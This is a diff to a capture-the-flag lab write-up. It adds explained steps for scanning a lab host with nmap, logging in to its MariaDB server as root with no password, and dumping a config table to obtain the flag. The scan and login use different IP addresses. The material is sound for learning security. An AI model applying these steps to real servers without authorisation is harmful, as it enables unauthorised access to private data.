@@ -25,7 +25,44 @@
 
 ---
 ## Flag:
-Get the flag from the database:
+Nmap scan:
+
+```console
+┌──(kali㉿kali)-[~]
+└─$ nmap -n -sC -sV 10.129.95.232
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 17:36 EDT
+Nmap scan report for 10.129.95.232
+Host is up (0.065s latency).
+Not shown: 999 closed tcp ports (conn-refused)
+PORT     STATE SERVICE VERSION
+3306/tcp open  mysql?
+|_ssl-cert: ERROR: Script execution failed (use -d to debug)
+|_tls-alpn: ERROR: Script execution failed (use -d to debug)
+|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
+|_ssl-date: ERROR: Script execution failed (use -d to debug)
+| mysql-info: 
+|   Protocol: 10
+|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
+|   Thread ID: 67
+|   Capabilities flags: 63486
+|   Some Capabilities: SupportsTransactions, SupportsCompression, Speaks41ProtocolOld, DontAllowDatabaseTableColumn, Support41Auth, FoundRows, SupportsLoadDataLocal, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, ODBCClient, LongColumnFlag, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
+|   Status: Autocommit
+|   Salt: 4:fr+{OVC.YY0$bEn|D|
+|_  Auth Plugin Name: mysql_native_password
+|_sslv2: ERROR: Script execution failed (use -d to debug)
+
+Nmap done: 1 IP address (1 host up) scanned in 205.29 seconds
+```
+
+MyQSL is running on port x. We can connect using `mysql`.
+
+Command:
+
+`mysql -h 10.129.148.58 -u root`
+
+`-h`: Connect to host {IP}.
+
+`-u`: Log on as user {user}.
 
 ```console
 ┌──(kali㉿kali)-[~]
@@ -38,6 +75,10 @@ Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
 
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 ```
+
+`show databases;` to print the contents of the database.
+
+Remember the `;` at the end of the command.
 
 ```
 MariaDB [(none)]> show databases;
@@ -53,6 +94,8 @@ MariaDB [(none)]> show databases;
 4 rows in set (0.067 sec)
 ```
 
+`use htb;` to select table 'htb'.
+
 ```
 MariaDB [(none)]> use htb;
 
@@ -61,6 +104,8 @@ You can turn off this feature to get a quicker startup with -A
 
 Database changed
 ```
+
+`show tables;` to show the contents of the table.
 
 ```
 MariaDB [htb]> show tables;
@@ -73,6 +118,8 @@ MariaDB [htb]> show tables;
 +---------------+
 2 rows in set (0.064 sec)
 ```
+
+`select * from config;` show all entries in the 'config' table.
 
 ```
 MariaDB [htb]> select * from config;
@@ -90,6 +137,8 @@ MariaDB [htb]> select * from config;
 +----+-----------------------+----------------------------------+
 7 rows in set (0.063 sec)
 ```
+
+And we got the flag!
 
 **Flag:** `7b4bec00d1a39e3dd4e021ec3d915da8`
 
